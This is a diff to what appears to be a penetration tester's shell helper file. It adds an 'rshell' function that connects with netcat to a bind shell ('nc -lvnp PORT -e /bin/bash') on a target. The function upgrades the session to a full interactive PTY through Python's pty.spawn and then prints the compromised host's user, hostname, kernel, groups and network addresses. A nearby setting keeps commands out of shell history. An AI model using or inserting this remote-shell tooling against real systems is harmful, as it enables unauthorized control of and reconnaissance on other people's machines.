@@ -416,5 +416,34 @@ function DomainResolve() {
 }
 # Example: $ DomainResolve nmap.org
 
+# rshell $IP PORT on target nc -lvnp PORT -e /bin/bash
+rshell() {
+  read rows cols < <(stty size)
+  stty raw -echo
+  cat <(cat << EOF
+export TERM=xterm-256color
+for PYTHON in python python2 python3; do /usr/bin/env \$PYTHON --version && break; done
+exec /usr/bin/env \$PYTHON -c 'import pty;pty.spawn(("/bin/bash", "--rcfile", "/etc/skel/.bashrc"))'
+stty rows $rows cols $cols
+# User commands to execute right after connection
+clear; \
+{ \
+cat /etc/issue; \
+printf "\n"; \
+printf "\\===========(\033[1;31m\$(whoami)@\$(hostname)\033[00m)===========/\n"; \
+printf "|\n"; \
+printf "| \033[1;34mKernel\033[00m :: \$(uname -r -s -m)\n"; \
+printf "| \033[1;34mGroups\033[00m :: \$(groups)\n"; \
+printf "\____________________________________________________________\n"; \ 
+printf "\n"
+ip --color=auto address || ifconfig; \
+} 2>/dev/null ; \
+echo;
+EOF
+  ) - | nc $@
+  stty sane
+}
+
+
 #stop capturing in history
 HISTIGNORE="cd:ls:exit:mkdir:Mkdir:pwd"
